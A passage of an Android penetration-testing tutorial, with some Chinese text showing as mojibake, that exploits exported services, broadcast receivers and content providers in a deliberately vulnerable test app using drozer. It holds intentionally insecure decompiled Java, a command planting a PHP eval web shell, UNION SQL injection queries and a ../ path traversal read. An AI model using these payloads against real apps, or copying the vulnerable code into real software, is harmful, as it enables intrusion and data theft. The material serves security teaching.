<h4 id="Implicit-Itent-Hijacking"><a href="#Implicit-Itent-Hijacking" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/qq_40037555/article/details/151955581</span><br><span class="line">2. éšå¼ Intent é€šè¿‡ actionã€categoryã€data ç­‰å±æ€§æ¥åŒ¹é…ç›®æ ‡ Activityï¼Œè€Œéç›´æ¥æŒ‡å®šå…·ä½“ç±»åã€‚è¿™æ„å‘³ç€ä»»ä½•åº”ç”¨åªè¦åœ¨ Manifest ä¸­å£°æ˜äº†åŒ¹é…è¿™äº›å±æ€§çš„ Activityï¼Œéƒ½å¯èƒ½è¢«ç³»ç»Ÿé€‰ä¸­å¹¶å¯åŠ¨ã€‚</span><br><span class="line">3. æ”»å‡»è€…å¯ä»¥åˆ›å»ºæ¶æ„åº”ç”¨ï¼Œåœ¨å…¶ Manifest ä¸­æ³¨å†Œä¸ç›®æ ‡åº”ç”¨ç›¸åŒçš„ Intent Filterï¼ˆåŒ…å«ç›¸åŒçš„ actionã€category ç­‰ï¼‰ã€‚å½“ç³»ç»Ÿè§£æéšå¼ Intent æ—¶ï¼Œæ¶æ„ Activity å¯èƒ½è¢«ä¼˜å…ˆåŒ¹é…å¹¶å¯åŠ¨ã€‚</span><br><span class="line">4. å»ºè®®å°½é‡ä½¿ç”¨æ˜¾å¼ Intent å¯åŠ¨å†…éƒ¨ Activityï¼Œå¯¹å¿…é¡»ä½¿ç”¨çš„éšå¼ Intentï¼Œåº”é€šè¿‡è®¾ç½®åŒ…åï¼ˆsetPackage ()ï¼‰æˆ–ä½¿ç”¨ç­¾åéªŒè¯ç­‰æ–¹å¼é™åˆ¶æ¥æ”¶è€…ã€‚</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Test method of verify the vulnerability is same to â€œPriEsc and bypassâ€</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151617879.png" alt="image-20250922151617879"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151734047.png" alt="image-20250922151734047"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151829137.png" alt="image-20250922151829137"></p>
</li>
<li><p>But there are some differences in exploit the vulnerability. Attackers usually need to prepare the same page for fishing and an application for monitoring target activities to call the fishing page automatically.</p>
</li>
</ol>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">Call the service to excute some dangerous functions with null privilege.</td>
</tr>
<tr>
<td align="center">Implicit Itent Hijacking</td>
<td align="center">Get some received sensitive datas or return some vicious datas to other functions.</td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access-1"><a href="#Unauthorized-Access-1" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Find out the attack surfaces about service with drozer(test app: com.asec.alan)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface com.asec.alan</span><br><span class="line">run app.service.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140010685.png" alt="image-20250923140010685"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140203300.png" alt="image-20250923140203300"></p>
</li>
<li><p>Confirm how the service is invoked by revesing the apk.</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableService&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_WRITE_FILE&quot;</span>.equals(action)) &#123;</span><br><span class="line">                writeToFile(intent.getStringExtra(<span class="string">&quot;file_path&quot;</span>), intent.getStringExtra(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_GET_SECRET&quot;</span>.equals(action)) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;æ•æ„Ÿä¿¡æ¯: &quot;</span> + getSensitiveInformation());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, i, i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(str));</span><br><span class="line">            fileWriter.write(str2);</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;å†™å…¥æ–‡ä»¶é”™è¯¯&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getSensitiveInformation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ•°æ®åº“å¯†ç : dbpass123; APIå¯†é’¥: secretkey456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;com.asec.alan.VulnerableService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>We can draw a conclusion that this service is invoked by starting rather than binding. So, we could start the service with drozer.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named writeToFile by the action whitch value is com.asec.alan.ACTION_WRITE_FILE</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_WRITE_FILE --extra string file_path &quot;/data/data/com.asec.alan/backdoor.php&quot; --extra string content &quot;&lt;?php @eval($_POST[&#x27;TscanPlus&#x27;]); ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142017901.png" alt="image-20250923142017901"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142047595.png" alt="image-20250923142047595"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monitor the <span class="built_in">log</span> by adb</span></span><br><span class="line">adb logcat VulnerableService:D *:S</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named getSensitiveInformation by the action <span class="built_in">which</span> value is com.asec.alan.ACTION_GET_SECRET</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_GET_SECRET</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142723441.png" alt="image-20250923142723441"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142647122.png" alt="image-20250923142647122"></p>
</li>
</ol>
<h4 id="Implicit-Itent-Hijacking-1"><a href="#Implicit-Itent-Hijacking-1" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. éšå¼ Intent é€šè¿‡ actionã€categoryã€data ç­‰å±æ€§åŒ¹é… Serviceï¼Œè€Œéç›´æ¥æŒ‡å®šå…·ä½“ç±»åã€‚è¿™ä½¿å¾—ä»»ä½•åº”ç”¨åªè¦åœ¨ Manifest ä¸­æ³¨å†Œäº†åŒ¹é…è¿™äº›å±æ€§çš„ Serviceï¼Œéƒ½å¯èƒ½è¢«ç³»ç»Ÿé€‰ä¸­å¹¶å¯åŠ¨ã€‚æ”»å‡»è€…å¯é€šè¿‡ä¼ªè£…ç›¸åŒçš„ Intent Filterï¼Œè®©ç³»ç»Ÿä¼˜å…ˆå¯åŠ¨æ¶æ„ Serviceã€‚</span><br><span class="line">2. Service é€šå¸¸åœ¨åå°è¿è¡Œï¼Œç”¨æˆ·æ— æ³•ç›´æ¥æ„ŸçŸ¥å…¶å¯åŠ¨å’Œè¿è¡ŒçŠ¶æ€ã€‚å³ä½¿æ¶æ„ Service è¢«å¯åŠ¨ï¼Œç”¨æˆ·ä¹Ÿéš¾ä»¥å¯Ÿè§‰ï¼Œå¯¼è‡´æ¶æ„ä»£ç å¯é•¿æœŸåœ¨åå°æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆå¦‚ç›‘å¬æ•°æ®ã€ç¯¡æ”¹é€šä¿¡ç­‰ï¼‰ã€‚</span><br><span class="line">3. ä¸º Service è®¾ç½®è‡ªå®šä¹‰æƒé™ï¼ˆandroid:permissionï¼‰ï¼Œå¹¶æ ¡éªŒè°ƒç”¨è€…çš„ç­¾åæˆ–æƒé™;å¯¹å¿…é¡»ä½¿ç”¨çš„éšå¼ Intentï¼Œé€šè¿‡setPackage()é™åˆ¶ç›®æ ‡åº”ç”¨åŒ…åã€‚</span><br></pre></td></tr></table></figure>

<h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><h4 id="Unauthorized-Access-2"><a href="#Unauthorized-Access-2" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Determine the information of broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924105533337.png" alt="image-20250924105533337"></p>
</li>
<li><p>Obtain the source code through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_SENSITIVE_OPERATION&quot;</span>.equals(intent.getAction())) &#123;</span><br><span class="line">            performSensitiveOperation(context, intent.getStringExtra(<span class="string">&quot;operation&quot;</span>), intent.getStringExtra(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">performSensitiveOperation</span><span class="params">(Context context, String str, String str2)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;æ‰§è¡Œäº†æ“ä½œ: &quot;</span> + str + <span class="string">&quot;ï¼Œæ•°æ®: &quot;</span> + str2, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Send counterfeit messages to the broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --component com.asec.alan com.asec.alan.VulnerableReceiver --action com.asec.alan.ACTION_SENSITIVE_OPERATION --extra string operation &quot;viciousData1&quot; --extra string data &quot;viciousData2&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924110021800.png" alt="image-20250924110021800"></p>
</li>
</ol>
<h3 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h3><h4 id="Unauthorized-Access-3"><a href="#Unauthorized-Access-3" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider æœªé™åˆ¶è®¿é—®æƒé™ï¼Œå¯¼è‡´åº”ç”¨å†…æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·ä¿¡æ¯ã€æ•°æ®åº“ï¼‰å¯è¢«ä»»æ„è¯»å–ã€‚</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Find out the attacksurface about com.asec.alan</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092722780.png" alt="image-20250924092722780"></p>
</li>
<li><p>Get the information about provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092955453.png" alt="image-20250924092955453"></p>
</li>
<li><p>Find uri of this provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094216723.png" alt="image-20250924094216723"></p>
</li>
<li><p>Query datas with uri</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094356414.png" alt="image-20250924094356414"></p>
</li>
</ol>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><ol>
<li><p>Find Sql Injection of the provider by running script</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924100755596.png" alt="image-20250924100755596"></p>
</li>
<li><p>Obtain the source code about ContentProvider through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentProvider;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.SQLException;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteOpenHelper;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableContentProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_NAME</span> <span class="operator">=</span> <span class="string">&quot;userdata.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DB_VERSION</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableProvider&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> SQLiteOpenHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues contentValues)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues contentValues, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.dbHelper = <span class="keyword">new</span> <span class="title class_">SQLiteOpenHelper</span>(getContext(), DB_NAME, <span class="literal">null</span>, <span class="number">1</span>) &#123; <span class="comment">// from class: com.asec.alan.VulnerableContentProvider.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase sQLiteDatabase, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase sQLiteDatabase)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;admin123&#x27;)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;user1&#x27;, &#x27;pass1&#x27;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        createTestFile();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createTestFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir(), <span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fileOutputStream.write(<span class="string">&quot;Vulnerable content for traversal test&quot;</span>.getBytes());</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;æµ‹è¯•æ–‡ä»¶å·²åˆ›å»ºï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;åˆ›å»ºæµ‹è¯•æ–‡ä»¶å¤±è´¥&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri uri, String str)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPath</span> <span class="operator">=</span> uri.getEncodedPath();</span><br><span class="line">        <span class="keyword">if</span> (encodedPath.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            encodedPath = encodedPath.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir().getParentFile(), encodedPath);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;å°è¯•è®¿é—®æ–‡ä»¶ï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file, <span class="number">268435456</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] strArr, String str, String[] strArr2, String str2)</span> &#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">readableDatabase</span> <span class="operator">=</span> <span class="built_in">this</span>.dbHelper.getReadableDatabase();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;SELECT * FROM users WHERE &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            str = <span class="string">&quot;1=1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> readableDatabase.rawQuery(sb.append(str).toString(), <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL Inject: determine the number of columns</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 order by 10&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924101320234.png" alt="image-20250924101320234"></p>
</li>
<li><p>SQL Inject: Determine some information about the database</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sqlite_version()&quot;</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sql from sqlite_master&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102628867.png" alt="image-20250924102628867"></p>
</li>
<li><p>SQL Inject: Query data of other tables</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 11, 22, locale from android_metadata&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102809532.png" alt="image-20250924102809532"></p>
</li>
</ol>
<h4 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider çš„openFile()æ–¹æ³•æœªéªŒè¯æ–‡ä»¶è·¯å¾„ï¼Œå¯¼è‡´æ”»å‡»è€…å¯è®¿é—®åº”ç”¨æ²™ç›’å¤–çš„ä»»æ„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Scanner traversal vulnerbilities of provider</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103551392.png" alt="image-20250924103551392"></p>
</li>
<li><p>Read other filesâ€™ contents by traversal vulnerability</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.asec.alan.provider/../../../../../../../../../../../../../../../system/etc/hosts</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103733116.png" alt="image-20250924103733116"></p>
</li>
</ol>
<h2 id="Unsafe-Configuration"><a href="#Unsafe-Configuration" class="headerlink" title="Unsafe Configuration"></a>Unsafe Configuration</h2><h3 id="Allow-Backup"><a href="#Allow-Backup" class="headerlink" title="Allow Backup"></a>Allow Backup</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">é€šè®¯å½•åº”ç”¨ï¼Œä¸€æ—¦åº”ç”¨ç¨‹åºæ”¯æŒå¤‡ä»½å’Œæ¢å¤åŠŸèƒ½ï¼Œæ”»å‡»è€…å³å¯é€šè¿‡ adb backup å’Œ adb restore è¿›è¡Œæ¢å¤æ–°å®‰è£…çš„åŒä¸€ä¸ªåº”ç”¨æ¥æŸ¥çœ‹èŠå¤©è®°å½•ç­‰ä¿¡æ¯</span><br><span class="line">æ”¯ä»˜é‡‘èç±»åº”ç”¨ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ­¤æ¥è¿›è¡Œæ¶æ„æ”¯ä»˜ã€ç›—å–å­˜æ¬¾ç­‰</span><br></pre></td></tr></table></figure>

